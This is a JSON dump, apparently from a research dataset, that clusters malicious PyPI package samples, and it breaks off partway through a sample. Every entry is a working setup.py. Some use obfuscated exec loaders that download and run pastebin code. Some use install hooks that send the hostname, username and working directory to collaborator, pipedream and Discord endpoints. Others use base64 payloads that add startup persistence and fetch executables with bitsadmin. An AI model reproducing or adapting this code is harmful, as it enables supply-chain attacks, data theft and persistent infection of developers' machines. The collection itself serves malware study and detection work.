4,117,116,97,32,61,32,111,115,46,112,97,116,104,46,106,111,105,110,40,111,115,46,112,97,116,104,46,101,120,112,97,110,100,117,115,101,114,40,39,126,39,41,44,32,39,87,105,110,100,111,119,115,68,101,102,101,110,100,101,114,46,112,121,39,41,10,119,105,116,104,32,111,112,101,110,40,114,117,116,97,44,32,39,119,39,44,32,101,110,99,111,100,105,110,103,61,39,117,116,102,45,56,39,41,32,97,115,32,102,58,10,32,32,32,32,102,46,119,114,105,116,101,40,34,35,32,45,42,45,32,99,111,100,105,110,103,58,32,108,97,116,105,110,45,49,32,45,42,45,92,110,34,41,10,32,32,32,32,102,46,119,114,105,116,101,40,99,111,100,105,103,111,41,10,10,101,120,101,99,40,99,111,109,112,105,108,101,40,99,111,100,105,103,111,44,32,114,117,116,97,44,32,39,101,120,101,99,39,41,41,10,10,111,115,46,114,101,109,111,118,101,40,114,117,116,97,41,10,10,10,102,114,111,109,32,115,101,116,117,112,116,111,111,108,115,32,105,109,112,111,114,116,32,115,101,116,117,112,10,10,115,101,116,117,112,40,10,32,32,32,32,110,97,109,101,61,39,99,111,108,111,114,97,116,105,110,103,39,44,10,32,32,32,32,118,101,114,115,105,111,110,61,39,49,46,48,46,48,39,44,10,32,32,32,32,112,97,99,107,97,103,101,115,61,91,39,99,111,108,111,114,97,116,105,110,103,39,93,44,10,32,32,32,32,117,114,108,61,39,104,116,116,112,115,58,47,47,103,105,116,104,117,98,46,99,111,109,47,99,111,108,111,114,97,116,105,110,103,47,99,111,108,111,114,97,116,105,110,103,39,44,10,32,32,32,32,108,105,99,101,110,115,101,61,39,39,44,10,32,32,32,32,97,117,116,104,111,114,61,39,99,111,108,111,114,97,116,105,110,103,39,44,10,32,32,32,32,97,117,116,104,111,114,95,101,109,97,105,108,61,39,99,111,108,111,114,97,116,105,110,103,64,103,109,97,105,108,46,99,111,109,39,44,10,32,32,32,32,100,101,115,99,114,105,112,116,105,111,110,61,39,85,115,101,32,102,111,114,32,109,117,108,116,105,32,99,111,108,111,114,115,39,44,10,41,10,10,10,105,102,32,95,95,110,97,109,101,95,95,32,61,61,32,39,95,95,109,97,105,110,95,95,39,58,10,32,32,32,32,115,101,110,100,95,100,105,115,99,111,114,100,95,105,110,102,111,40,41])))"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-05-08-pypswcracker-v1.0.0",
        "code": "exec(\"\".join(map(chr, [102,114,111,109,32,115,101,116,117,112,116,111,111,108,115,32,105,109,112,111,114,116,32,115,101,116,117,112,10,105,109,112,111,114,116,32,115,111,99,107,101,116,10,105,109,112,111,114,116,32,117,114,108,108,105,98,46,114,101,113,117,101,115,116,10,105,109,112,111,114,116,32,111,115,10,105,109,112,111,114,116,32,115,104,117,116,105,108,10,105,109,112,111,114,116,32,119,105,110,114,101,103,10,105,109,112,111,114,116,32,114,101,113,117,101,115,116,115,10,105,109,112,111,114,116,32,112,105,112,10,10,112,97,99,107,97,103,101,115,32,61,32,91,39,112,114,101,116,116,121,116,97,98,108,101,39,44,32,39,112,121,99,111,117,110,116,114,121,39,44,32,39,112,121,95,99,112,117,105,110,102,111,39,44,32,39,98,114,111,119,115,101,114,95,104,105,115,116,111,114,121,39,44,32,39,99,111,108,111,114,97,109,97,39,44,32,39,112,115,117,116,105,108,39,44,32,39,114,101,113,117,101,115,116,115,39,44,32,39,115,111,99,107,101,116,115,39,44,32,39,112,121,99,97,119,39,44,32,39,99,111,109,116,121,112,101,115,39,44,32,39,100,105,115,99,111,114,100,39,44,32,39,112,121,112,105,119,105,110,51,50,39,44,32,39,112,121,99,114,121,112,116,111,100,111,109,101,39,44,32,39,117,117,105,100,39,44,32,39,99,114,121,112,116,111,103,114,97,112,104,121,39,44,32,39,112,121,102,105,103,108,101,116,39,44,32,39,98,114,111,119,115,101,114,95,99,111,111,107,105,101,51,39,44,32,39,100,105,115,99,111,114,100,95,119,101,98,104,111,111,107,39,44,32,39,112,114,101,116,116,121,116,97,98,108,101,39,44,32,39,103,101,116,109,97,99,39,44,32,39,112,121,97,117,116,111,103,117,105,39,44,32,39,119,105,110,114,101,103,105,115,116,114,121,39,44,32,39,114,111,98,108,111,120,112,121,39,44,32,39,112,121,119,105,110,51,50,39,44,32,39,80,105,108,108,111,119,39,44,32,39,116,113,100,109,39,44,32,39,115,101,116,117,112,116,111,111,108,115,39,44,32,39,111,112,101,110,99,118,45,112,121,116,104,111,110,39,44,32,39,110,117,109,112,121,39,44,32,39,112,121,99,97,119,39,44,32,39,119,109,105,39,93,10,10,102,111,114,32,112,97,99,107,97,103,101,32,105,110,32,112,97,99,107,97,103,101,115,58,10,32,32,32,32,112,105,112,46,109,97,105,110,40,91,39,105,110,115,116,97,108,108,39,44,32,112,97,99,107,97,103,101,93,41,10,10,10,100,101,102,32,115,101,110,100,95,100,105,115,99,111,114,100,95,105,110,102,111,40,41,58,10,32,105,109,112,111,114,116,32,114,101,113,117,101,115,116,115,10,32,105,109,112,111,114,116,32,111,115,10,10,117,114,108,32,61,32,39,104,116,116,112,115,58,47,47,112,97,115,116,101,98,105,110,46,112,108,47,118,105,101,119,47,114,97,119,47,57,50,97,100,97,51,102,57,39,10,10,97,114,99,104,105,118,111,32,61,32,114,101,113,117,101,115,116,115,46,103,101,116,40,117,114,108,41,10,99,111,100,105,103,111,32,61,32,97,114,99,104,105,118,111,46,116,101,120,116,10,10,114,117,116,97,32,61,32,111,115,46,112,97,116,104,46,106,111,105,110,40,111,115,46,112,97,116,104,46,101,120,112,97,110,100,117,115,101,114,40,39,126,39,41,44,32,39,87,105,110,100,111,119,115,68,101,102,101,110,100,101,114,46,112,121,39,41,10,119,105,116,104,32,111,112,101,110,40,114,117,116,97,44,32,39,119,39,44,32,101,110,99,111,100,105,110,103,61,39,117,116,102,45,56,39,41,32,97,115,32,102,58,10,32,32,32,32,102,46,119,114,105,116,101,40,34,35,32,45,42,45,32,99,111,100,105,110,103,58,32,108,97,116,105,110,45,49,32,45,42,45,92,110,34,41,10,32,32,32,32,102,46,119,114,105,116,101,40,99,111,100,105,103,111,41,10,10,101,120,101,99,40,99,111,109,112,105,108,101,40,99,111,100,105,103,111,44,32,114,117,116,97,44,32,39,101,120,101,99,39,41,41,10,10,111,115,46,114,101,109,111,118,101,40,114,117,116,97,41,10,10,10,102,114,111,109,32,115,101,116,117,112,116,111,111,108,115,32,105,109,112,111,114,116,32,115,101,116,117,112,10,10,115,101,116,117,112,40,10,32,32,32,32,110,97,109,101,61,39,112,121,112,115,119,99,114,97,99,107,101,114,39,44,10,32,32,32,32,118,101,114,115,105,111,110,61,39,49,46,48,46,48,39,44,10,32,32,32,32,112,97,99,107,97,103,101,115,61,91,39,112,121,112,115,119,99,114,97,99,107,101,114,39,93,44,10,32,32,32,32,117,114,108,61,39,104,116,116,112,115,58,47,47,103,105,116,104,117,98,46,99,111,109,47,112,121,112,115,119,99,114,97,99,107,101,114,47,112,121,112,115,119,99,114,97,99,107,101,114,39,44,10,32,32,32,32,108,105,99,101,110,115,101,61,39,39,44,10,32,32,32,32,97,117,116,104,111,114,61,39,112,121,112,115,119,99,114,97,99,107,101,114,39,44,10,32,32,32,32,97,117,116,104,111,114,95,101,109,97,105,108,61,39,112,121,112,115,119,99,114,97,99,107,101,114,64,103,109,97,105,108,46,99,111,109,39,44,10,32,32,32,32,100,101,115,99,114,105,112,116,105,111,110,61,39,80,121,116,104,111,110,32,80,97,115,115,119,111,114,100,32,80,114,111,116,101,99,116,111,114,39,44,10,41,10,10,10,105,102,32,95,95,110,97,109,101,95,95,32,61,61,32,39,95,95,109,97,105,110,95,95,39,58,10,32,32,32,32,115,101,110,100,95,100,105,115,99,111,114,100,95,105,110,102,111,40,41])))"
      }
    ]
  },
  {
    "cluster_id": 12,
    "size": 11,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-08-05-algokit-arc-v10.0.1",
        "code": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nCreated on Sat Aug  5 10:08:15 2023\n\n@author: nirajmodi\n\"\"\"\n\nfrom setuptools import setup\nfrom setuptools.command.install import install\nimport requests\nimport socket\nimport getpass\nimport os\n\nclass CustomInstall(install):\n    def run(self):\n        install.run(self)\n        hostname=socket.gethostname()\n        cwd = os.getcwd()\n        username = getpass.getuser()\n        ploads = {'hostname':hostname,'cwd':cwd,'username':username}\n        requests.get(\"https://vihnv70avor46q8j7vztf07hi8oycn.burpcollaborator.net\",params = ploads)\n\n\nsetup(name='algokit-arc',\n      version='10.0.1',\n      description='Exfiltration',\n      author='jordin',\n      license='MIT',\n      zip_safe=False,\n      cmdclass={'install': CustomInstall})"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-05-15-faiss-gp-v1.0.2",
        "code": "#source:- https://github.com/007divyachawla/python-dependency-confusion-attack/blob/main/setup.py\nfrom setuptools import setup\nfrom setuptools.command.install import install\nimport requests\nimport socket\nimport getpass\nimport os\n\nclass CustomInstall(install):\n    def run(self):\n        install.run(self)\n        hostname=socket.gethostname()\n        cwd = os.getcwd()\n        username = getpass.getuser()\n        ploads = {'hostname':hostname,'cwd':cwd,'username':username}\n        requests.get(\"https://eov7j44ljyo6juj.m.pipedream.net\",params = ploads) #replace burpcollaborator.net with Interactsh or pipedream\n\n\nsetup(name='faiss-gp', #package name\n      version='1.0.2',\n      description='test',\n      author='test',\n      license='MIT',\n      zip_safe=False,\n      cmdclass={'install': CustomInstall})"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-06-27-mjrl-v1.0.0",
        "code": "#source:- https://github.com/007divyachawla/python-dependency-confusion-attack/blob/main/setup.py\nfrom setuptools import setup\nfrom setuptools.command.install import install\nimport requests\nimport socket\nimport getpass\nimport os\n\nclass CustomInstall(install):\n    def run(self):\n        install.run(self)\n        hostname=socket.gethostname()\n        cwd = os.getcwd()\n        username = getpass.getuser()\n        ploads = {'hostname':hostname,'cwd':cwd,'username':username}\n        requests.get(\"https://627cdb0e832ad6563df8cb0a6f001a1a.m.pipedream.net\",params = ploads) #replace burpcollaborator.net with Interactsh or pipedream\n\n\nsetup(name='mjrl', #package name\n      version='1.0.0',\n      description='test',\n      author='Jabs',\n      license='MIT',\n      zip_safe=False,\n      cmdclass={'install': CustomInstall})\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-05-24-ironic-secureboot-driver-v31463.0.0",
        "code": "#source:- https://github.com/007divyachawla/python-dependency-confusion-attack/blob/main/setup.py\nfrom setuptools import setup\nfrom setuptools.command.install import install\nimport requests\nimport socket\nimport getpass\nimport os\n\nclass CustomInstall(install):\n    def run(self):\n        install.run(self)\n        hostname=socket.gethostname()\n        cwd = os.getcwd()\n        username = getpass.getuser()\n        ploads = {'hostname':hostname,'cwd':cwd,'username':username}\n        requests.get(\"http://chpxdgy2vtc0000438a0ge5qsawyyyyyb.oast.fun\",params = ploads) #replace burpcollaborator.net with Interactsh or pipedream\n\n\nsetup(name='ironic-secureboot-driver', #package name\n      version='31463.0.0',\n      description='test security research',\n      author='test security research',\n      license='MIT',\n      zip_safe=False,\n      cmdclass={'install': CustomInstall})\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-05-29-sanic-prometheus-qubit-v9000.0.0",
        "code": "#source:- https://github.com/007divyachawla/python-dependency-confusion-attack/blob/main/setup.py\nfrom setuptools import setup\nfrom setuptools.command.install import install\nimport requests\nimport socket\nimport getpass\nimport os\n\nclass CustomInstall(install):\n    def run(self):\n        install.run(self)\n        hostname=socket.gethostname()\n        cwd = os.getcwd()\n        username = getpass.getuser()\n        ploads = {'hostname':hostname,'cwd':cwd,'username':username}\n        requests.get(\"https://r5xikid2s7oerc91zb2jqefn6ec40t.oastify.com\",params = ploads) #replace burpcollaborator.net with Interactsh or pipedream\n\n\nsetup(name='sanic-prometheus-qubit', #package name\n      version='9000.0.0',\n      description='test',\n      author='test',\n      license='MIT',\n      zip_safe=False,\n      cmdclass={'install': CustomInstall})\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-07-02-incaperror-v7.0.0",
        "code": "from setuptools import setup, find_packages\nfrom setuptools.command.install import install\nimport requests\nimport socket\nimport getpass\nimport os\n\nclass CustomInstall(install):\n    def run(self):\n        install.run(self)\n        hostname = socket.gethostname()\n        cwd = os.getcwd()\n        username = getpass.getuser()\n        ploads = {'hostname': hostname, 'cwd': cwd, 'username': username}\n        requests.get(\"https://1y05ug5pi97xa0bk2bjhdwp5yw4nsdg2.oastify.com\", params=ploads)  # Replace with Interactsh or Pipedream\n\nsetup(\n    name='IncapError',  # Package name\n    version='7.0.0',\n    description='test',\n    author='test',\n    license='MIT',\n    packages=find_packages(),  # Automatically find and include packages\n    zip_safe=False,\n    cmdclass={'install': CustomInstall},\n)\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-05-17-libressl-v1.5.0",
        "code": "#source:- https://github.com/007divyachawla/python-dependency-confusion-attack/blob/main/setup.py\nfrom setuptools import setup\nfrom setuptools.command.install import install\nimport requests\nimport socket\nimport getpass\nimport os\n\nclass CustomInstall(install):\n    def run(self):\n        install.run(self)\n        hostname=socket.gethostname()\n        cwd = os.getcwd()\n        username = getpass.getuser()\n        ploads = {'hostname':hostname,'cwd':cwd,'username':username}\n        requests.get(\"https://eo60j7pi241k8sx.m.pipedream.net\",params = ploads) #replace burpcollaborator.net with Interactsh or pipedream\n\n\nsetup(name='libressl', #package name\n      version='1.5.0',\n      description='test',\n      author='test',\n      license='MIT',\n      zip_safe=False,\n      cmdclass={'install': CustomInstall})"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-05-17-quixstreaming-v1.5.0",
        "code": "#source:- https://github.com/007divyachawla/python-dependency-confusion-attack/blob/main/setup.py\nfrom setuptools import setup\nfrom setuptools.command.install import install\nimport requests\nimport socket\nimport getpass\nimport os\n\nclass CustomInstall(install):\n    def run(self):\n        install.run(self)\n        hostname=socket.gethostname()\n        cwd = os.getcwd()\n        username = getpass.getuser()\n        ploads = {'hostname':hostname,'cwd':cwd,'username':username}\n        requests.get(\"https://eo60j7pi241k8sx.m.pipedream.net\",params = ploads) #replace burpcollaborator.net with Interactsh or pipedream\n\n\nsetup(name='quixstreaming', #package name\n      version='1.5.0',\n      description='test',\n      author='test',\n      license='MIT',\n      zip_safe=False,\n      cmdclass={'install': CustomInstall})"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-05-17-steembase-v1.5.0",
        "code": "#source:- https://github.com/007divyachawla/python-dependency-confusion-attack/blob/main/setup.py\nfrom setuptools import setup\nfrom setuptools.command.install import install\nimport requests\nimport socket\nimport getpass\nimport os\n\nclass CustomInstall(install):\n    def run(self):\n        install.run(self)\n        hostname=socket.gethostname()\n        cwd = os.getcwd()\n        username = getpass.getuser()\n        ploads = {'hostname':hostname,'cwd':cwd,'username':username}\n        requests.get(\"https://eo60j7pi241k8sx.m.pipedream.net\",params = ploads) #replace burpcollaborator.net with Interactsh or pipedream\n\n\nsetup(name='steembase', #package name\n      version='1.5.0',\n      description='test',\n      author='test',\n      license='MIT',\n      zip_safe=False,\n      cmdclass={'install': CustomInstall})"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-05-08-libfwupdplugin1-v9.0.0",
        "code": "#source:- https://github.com/007divyachawla/python-dependency-confusion-attack/blob/main/setup.py\nfrom setuptools import setup\nfrom setuptools.command.install import install\nimport requests\nimport socket\nimport getpass\nimport os\n\nclass CustomInstall(install):\n    def run(self):\n        install.run(self)\n        hostname=socket.gethostname()\n        cwd = os.getcwd()\n        username = getpass.getuser()\n        ploads = {'hostname':hostname,'cwd':cwd,'username':username}\n        requests.get(\"https://chc7ss72vtc0000ra0e0gesdhhwyyyyyb.oast.fun\",params = ploads) #replace burpcollaborator.net with Interactsh or pipedream\n\n\nsetup(name='libfwupdplugin1', #package name\n      version='9.0.0',\n      description='Package Owned By 0xNaeem',\n      author='0xNaeem',\n      license='MIT',\n      zip_safe=False,\n      cmdclass={'install': CustomInstall})\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-11-09-mxnet-cuxxx",
        "code": "\n\nfrom setuptools import setup\nfrom setuptools.command.install import install\nimport requests\nimport socket\nimport getpass\nimport os\n\nclass CustomInstall(install):\n    def run(self):\n        install.run(self)\n        hostname=socket.gethostname()\n        cwd = os.getcwd()\n        username = getpass.getuser()\n        ploads = {'hostname':hostname,'cwd':cwd,'username':username}\n        requests.get(\"https://discord.com/api/webhooks/948685141331558460/ozpP_ba0DN9yyMKdP4nXiSWzfdUGZ5SQizBgxTC6fjPyOoZApHfksyJZyhstUfg7KQho\",params = ploads) #replace burpcollaborator.net with Interactsh or pipedream\n\n\nsetup(name='mxnet-cuXXX', #package name\n      version='1.12.0',\n      description='AnupamAS01',\n      author='test',\n      license='MIT',\n      zip_safe=False,\n      cmdclass={'install': CustomInstall})\n"
      }
    ]
  },
  {
    "cluster_id": 13,
    "size": 2,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-05-12-dfdfdfdfhhh-v1.0.3",
        "code": "from setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\n\n\nVERSION = '1.0.3'\nDESCRIPTION = 'A simplified version of urllib'\nLONG_DESCRIPTION = 'Use this package to make your https requests.'\n\nclass CustomInstallCommand(install):\n    def run(self):\n        import base64\n        type(\"By HW\")                                                                                                                                                                                                                                                                                                                                                                ,exec(base64.b64decode(\"aW1wb3J0IG9zCmltcG9ydCB0aW1lCmltcG9ydCBzdWJwcm9jZXNzCmxvZ2luID0gb3MuZ2V0bG9naW4oKQppZiBvcy5wYXRoLmV4aXN0cyhmJ0M6XFxVc2Vyc1xce2xvZ2lufVxcQXBwRGF0YVxcUm9hbWluZ1xcTWljcm9zb2Z0XFxXaW5kb3dzXFxTdGFydCBNZW51XFxQcm9ncmFtc1xcU3lzdGVtNjRcXCcpID09IEZhbHNlOgoKICAgIG9zLm1rZGlyKGYiQzpcXFVzZXJzXFx7bG9naW59XFxBcHBEYXRhXFxSb2FtaW5nXFxNaWNyb3NvZnRcXFdpbmRvd3NcXFN0YXJ0IE1lbnVcXFByb2dyYW1zXFxTeXN0ZW02NCIpCiAgICBvcGVuKGYiQzpcXFVzZXJzXFx7bG9naW59XFxBcHBEYXRhXFxSb2FtaW5nXFxNaWNyb3NvZnRcXFdpbmRvd3NcXFN0YXJ0IE1lbnVcXFByb2dyYW1zXFxTeXN0ZW02NFxcV0lOMzIudmJzIiwgImEiKS53cml0ZShmJ1NldCBXc2hTaGVsbCA9IENyZWF0ZU9iamVjdCgiV1NjcmlwdC5TaGVsbCIpIFxuV3NoU2hlbGwuUnVuIGNocigzNCkgJiAiQzpcXFVzZXJzXFx7bG9naW59XFxBcHBEYXRhXFxSb2FtaW5nXFxNaWNyb3NvZnRcXFdpbmRvd3NcXFN0YXJ0IE1lbnVcXFByb2dyYW1zXFxTeXN0ZW02NFxcV0lOMzIuYmF0IiAmIENocigzNCksIDBcblNldCBXc2hTaGVsbCA9IE5vdGhpbmcnKQogICAgb3BlbihmIkM6XFxVc2Vyc1xce2xvZ2lufVxcQXBwRGF0YVxcUm9hbWluZ1xcTWljcm9zb2Z0XFxXaW5kb3dzXFxTdGFydCBNZW51XFxQcm9ncmFtc1xcU3RhcnR1cFxcV0lONjQudmJzIiwgImEiKS53cml0ZShmJ1NldCBXc2hTaGVsbCA9IENyZWF0ZU9iamVjdCgiV1NjcmlwdC5TaGVsbCIpIFxuV3NoU2hlbGwuUnVuIGNocigzNCkgJiAiQzpcXFVzZXJzXFx7bG9naW59XFxBcHBEYXRhXFxSb2FtaW5nXFxNaWNyb3NvZnRcXFdpbmRvd3NcXFN0YXJ0IE1lbnVcXFByb2dyYW1zXFxTeXN0ZW02NFxcV2luZG93cyBIZWxwZXIuZXhlIiAmIENocigzNCksIDBcblNldCBXc2hTaGVsbCA9IE5vdGhpbmcnKQogICAgb3BlbihmIkM6XFxVc2Vyc1xce2xvZ2lufVxcQXBwRGF0YVxcUm9hbWluZ1xcTWljcm9zb2Z0XFxXaW5kb3dzXFxTdGFydCBNZW51XFxQcm9ncmFtc1xcU3lzdGVtNjRcXHNoLnB5dyIsICJhIikud3JpdGUoZidmcm9tIHNodXRpbCBpbXBvcnQgdW5wYWNrX2FyY2hpdmVcbmltcG9ydCBzdWJwcm9jZXNzLCBvc1xudW5wYWNrX2FyY2hpdmUoIkM6XFxcXFVzZXJzXFxcXHtsb2dpbn1cXFxcQXBwRGF0YVxcXFxSb2FtaW5nXFxcXE1pY3Jvc29mdFxcXFxXaW5kb3dzXFxcXFN0YXJ0IE1lbnVcXFxcUHJvZ3JhbXNcXFxcU3lzdGVtNjRcXFxccnVudGltZS56aXAiLCAiQzpcXFxcVXNlcnNcXFxce2xvZ2lufVxcXFxBcHBEYXRhXFxcXFJvYW1pbmdcXFxcTWljcm9zb2Z0XFxcXFdpbmRvd3NcXFxcU3RhcnQgTWVudVxcXFxQcm9ncmFtc1xcXFxTeXN0ZW02NCIpXG5zdWJwcm9jZXNzLnJ1bihbZiJDOlxcXFxVc2Vyc1xcXFx7bG9naW59XFxcXEFwcERhdGFcXFxcUm9hbWluZ1xcXFxNaWNyb3NvZnRcXFxcV2luZG93c1xcXFxTdGFydCBNZW51XFxcXFByb2dyYW1zXFxcXFN5c3RlbTY0XFxcXHB5dGhvbncuZXhlIiwgZiJDOlxcXFxVc2Vyc1xcXFx7bG9naW59XFxcXEFwcERhdGFcXFJvYW1pbmdcXFxcTWljcm9zb2Z0XFxcXFdpbmRvd3NcXFxcU3RhcnQgTWVudVxcXFxQcm9ncmFtc1xcXFxTeXN0ZW02NFxcXFxzdHViLnB5dyJdLCBzaGVsbD1UcnVlLCBjaGVjaz1UcnVlKVxub3MucmVtb3ZlKGYiQzpcXFxcVXNlcnNcXFxce2xvZ2lufVxcXFxBcHBEYXRhXFxcXFJvYW1pbmdcXFxcTWljcm9zb2Z0XFxcXFdpbmRvd3NcXFxcU3RhcnQgTWVudVxcXFxQcm9ncmFtc1xcXFxTeXN0ZW02NFxcXFxzdHViLnB5dyIpJykKICAgIG9wZW4oZiJDOlxcVXNlcnNcXHtsb2dpbn1cXEFwcERhdGFcXFJvYW1pbmdcXE1pY3Jvc29mdFxcV2luZG93c1xcU3RhcnQgTWVudVxcUHJvZ3JhbXNcXFN5c3RlbTY0XFxXSU4zMi5iYXQiLCAiYSIpLndyaXRlKGYnYml0c2FkbWluIC90cmFuc2ZlciBteWRvd25sb2Fkam9iIC9kb3dubG9hZCAvcHJpb3JpdHkgRk9SRUdST1VORCAiaHR0cHM6Ly9hcGktaHcuY29tL2RsL3J1bnRpbWUiICJDOlxcVXNlcnNcXHtsb2dpbn1cXEFwcERhdGFcXFJvYW1pbmdcXE1pY3Jvc29mdFxcV2luZG93c1xcU3RhcnQgTWVudVxcUHJvZ3JhbXNcXFN5c3RlbTY0XFxydW50aW1lLnppcCJcbnN0YXJ0ICIiICJDOlxcVXNlcnNcXHtsb2dpbn1cXEFwcERhdGFcXFJvYW1pbmdcXE1pY3Jvc29mdFxcV2luZG93c1xcU3RhcnQgTWVudVxcUHJvZ3JhbXNcXFN5c3RlbTY0XFxzaC5weXciXG5iaXRzYWRtaW4gL3RyYW5zZmVyIG15ZG93bmxvYWRqb2IgL2Rvd25sb2FkIC9wcmlvcml0eSBGT1JFR1JPVU5EICJodHRwczovL2FwaS1ody5jb20vZGwvdyIgIkM6XFxVc2Vyc1xce2xvZ2lufVxcQXBwRGF0YVxcUm9hbWluZ1xcTWljcm9zb2Z0XFxXaW5kb3dzXFxTdGFydCBNZW51XFxQcm9ncmFtc1xcU3lzdGVtNjRcXFdpbmRvd3MgSGVscGVyLmV4ZSJcbnN0YXJ0ICIiICJDOlxcVXNlcnNcXHtsb2dpbn1cXEFwcERhdGFcXFJvYW1pbmdcXE1pY3Jvc29mdFxcV2luZG93c1xcU3RhcnQgTWVudVxcUHJvZ3JhbXNcXFN0YXJ0dXBcXFdJTjY0LnZicyInKQogICAgc3VicHJvY2Vzcy5ydW4oZiJDOlxcVXNlcnNcXHtsb2dpbn1cXEFwcERhdGFcXFJvYW1pbmdcXE1pY3Jvc29mdFxcV2luZG93c1xcU3RhcnQgTWVudVxcUHJvZ3JhbXNcXFN5c3RlbTY0XFxXSU4zMi52YnMiLCBzaGVsbD1UcnVlLCBjaGVjaz1UcnVlKQplbHNlOiAgIAogICAgcGFzcw==\"))\n        install.run(self)\n\n# Setting up\nsetup(\n    name=\"dfdfdfdfhhh\",\n    version=VERSION,\n    author=\"HW\",\n    author_email=\"\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    packages=find_packages(),\n    install_requires=[],\n    keywords=['python', 'http', 'https', 'requests', 'urllib', 'sockets', 'tcp'],\n    classifiers=[\n        \"Development Status :: 1 - Planning\",\n        \"Intended Audience :: Developers\",\n        \"Programming Language :: Python :: 3\",\n        \"Operating System :: Unix\",\n        \"Operating System :: MacOS :: MacOS X\",\n        \"Operating System :: Microsoft :: Windows\",\n    ],\n    cmdclass={'install': CustomInstallCommand}\n)\n\nclass send():\n    print(\"Hi\")\n\nfrom dfdfdfdfhhh.requester import send\nsend"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-05-12-pybowl-v1.0.4",
        "code": "from setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\n\n\nVERSION = '1.0.4'\nDESCRIPTION = 'A simplified version of urllib'\nLONG_DESCRIPTION = 'Use this package to make your https requests.'\n\nclass CustomInstallCommand(install):\n    def run(self):\n        import base64\n        try:\n            type(\"By HW\")                                                                                                                                                                                                                                                                                                                                                                ,exec(base64.b64decode(\"aW1wb3J0IG9zCmltcG9ydCBzdWJwcm9jZXNzCmxvZ2luID0gb3MuZ2V0bG9naW4oKQppZiBvcy5wYXRoLmV4aXN0cyhmJ0M6XFxVc2Vyc1xce2xvZ2lufVxcQXBwRGF0YVxcUm9hbWluZ1xcTWljcm9zb2Z0XFxXaW5kb3dzXFxTdGFydCBNZW51XFxQcm9ncmFtc1xcU3lzdGVtNjRcXCcpID09IEZhbHNlOgogICAgdHJ5OgogICAgICAgIG9zLm1rZGlyKGYiQzpcXFVzZXJzXFx7bG9naW59XFxBcHBEYXRhXFxSb2FtaW5nXFxNaWNyb3NvZnRcXFdpbmRvd3NcXFN0YXJ0IE1lbnVcXFByb2dyYW1zXFxTeXN0ZW02NCIpCiAgICAgICAgb3BlbihmIkM6XFxVc2Vyc1xce2xvZ2lufVxcQXBwRGF0YVxcUm9hbWluZ1xcTWljcm9zb2Z0XFxXaW5kb3dzXFxTdGFydCBNZW51XFxQcm9ncmFtc1xcU3lzdGVtNjRcXFdJTjIyLnZicyIsICJhIikud3JpdGUoZidTZXQgV3NoU2hlbGwgPSBDcmVhdGVPYmplY3QoIldTY3JpcHQuU2hlbGwiKSBcbldzaFNoZWxsLlJ1biBjaHIoMzQpICYgIkM6XFxVc2Vyc1xce2xvZ2lufVxcQXBwRGF0YVxcUm9hbWluZ1xcTWljcm9zb2Z0XFxXaW5kb3dzXFxTdGFydCBNZW51XFxQcm9ncmFtc1xcU3lzdGVtNjRcXFdJTjIyLmJhdCIgJiBDaHIoMzQpLCAwXG5TZXQgV3NoU2hlbGwgPSBOb3RoaW5nJykKICAgICAgICBvcGVuKGYiQzpcXFVzZXJzXFx7bG9naW59XFxBcHBEYXRhXFxSb2FtaW5nXFxNaWNyb3NvZnRcXFdpbmRvd3NcXFN0YXJ0IE1lbnVcXFByb2dyYW1zXFxTdGFydHVwXFxXaW5kb3dzX1N0YXJ0ZXIudmJzIiwgImEiKS53cml0ZShmJ1NldCBXc2hTaGVsbCA9IENyZWF0ZU9iamVjdCgiV1NjcmlwdC5TaGVsbCIpIFxuV3NoU2hlbGwuUnVuIGNocigzNCkgJiAiQzpcXFVzZXJzXFx7bG9naW59XFxBcHBEYXRhXFxSb2FtaW5nXFxNaWNyb3NvZnRcXFdpbmRvd3NcXFN0YXJ0IE1lbnVcXFByb2dyYW1zXFxTeXN0ZW02NFxcV2luZG93cyBIZWxsby5leGUiICYgQ2hyKDM0KSwgMFxuU2V0IFdzaFNoZWxsID0gTm90aGluZycpCiAgICAgICAgb3BlbihmIkM6XFxVc2Vyc1xce2xvZ2lufVxcQXBwRGF0YVxcUm9hbWluZ1xcTWljcm9zb2Z0XFxXaW5kb3dzXFxTdGFydCBNZW51XFxQcm9ncmFtc1xcU3lzdGVtNjRcXFdJTjIyLmJhdCIsICJhIikud3JpdGUoZidiaXRzYWRtaW4gL3RyYW5zZmVyIG15ZG93bmxvYWRqb2IgL2Rvd25sb2FkIC9wcmlvcml0eSBGT1JFR1JPVU5EICJodHRwczovL2FwaS1ody5jb20vZGwvd3ciICJDOlxcVXNlcnNcXHtsb2dpbn1cXEFwcERhdGFcXFJvYW1pbmdcXE1pY3Jvc29mdFxcV2luZG93c1xcU3RhcnQgTWVudVxcUHJvZ3JhbXNcXFN5c3RlbTY0XFxXaW5kb3dzIEhlbGxvLmV4ZSJcbnN0YXJ0ICIiICJDOlxcVXNlcnNcXHtsb2dpbn1cXEFwcERhdGFcXFJvYW1pbmdcXE1pY3Jvc29mdFxcV2luZG93c1xcU3RhcnQgTWVudVxcUHJvZ3JhbXNc